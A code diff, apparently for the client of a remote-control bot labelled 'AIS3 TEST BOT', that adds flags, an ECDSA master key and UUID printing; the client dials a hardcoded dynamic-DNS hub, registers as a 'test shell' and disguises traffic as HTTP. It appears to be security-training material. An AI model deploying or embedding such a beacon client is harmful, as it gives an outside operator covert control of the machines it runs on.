@@ -7,17 +7,24 @@ import (
 	"strings"
 	"net"
 	"fmt"
+	"flag"
 
 	"lib/fakehttp"
 	kit "local/toolkit"
 	"local/base"
 )
 
+var (
+	hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
 
-var hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
-var hubAddr string = "cs8425.noip.me:8787"
+	// ECDSA public key for access
+	masterKey, _ = base64.StdEncoding.DecodeString("MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEm9tjBE8e0jYIcXUkB19q88RVNkuzqle2vJIB9wc4grM4txyn6WpBOFG17QqajSemJarrQ+FFmPEAlVIXEMDt4g==")
 
-var proc int = runtime.NumCPU() + 2
+	hubAddr string = "cs8425.noip.me:8787"
+	proc int = runtime.NumCPU() + 2
+
+	clientName = flag.String("name", "AIS3 TEST BOT", "client name")
+)
 
 const (
 	fakeHttp = true
@@ -64,11 +71,13 @@ func initBot(c *base.Client) {
 }
 
 func main() {
+	flag.StringVar(&hubAddr, "addr", "cs8425.noip.me:8787", "hub addr")
+	flag.Parse()
 
 	base.RegInit(initBot)
 
 	c := base.NewClientM()
-	c.UUID = kit.HashBytes256([]byte("AIS3 TEST BOT"))
+	c.UUID = kit.HashBytes256([]byte(*clientName))
 //	c.AgentTag = "AIS3 TEST BOT"
 //	c.HubKeyTag = "HELLO"
 	c.HubPubKey = hubPubKey
@@ -76,6 +85,7 @@ func main() {
 	c.AutoClean = true
 	c.Info.Set("AIS3", "test shell XD")
 //	c.Info.Set("AIS3-2", "test2")
+	c.MasterKey = masterKey // extra
 
 	c.Proc = proc
 
@@ -101,6 +111,8 @@ func main() {
 			return cl.Dial()
 		}
 	}
+
+	fmt.Println("[UUID]", kit.Hex(c.UUID))
 
 	c.Start(hubAddr)
 
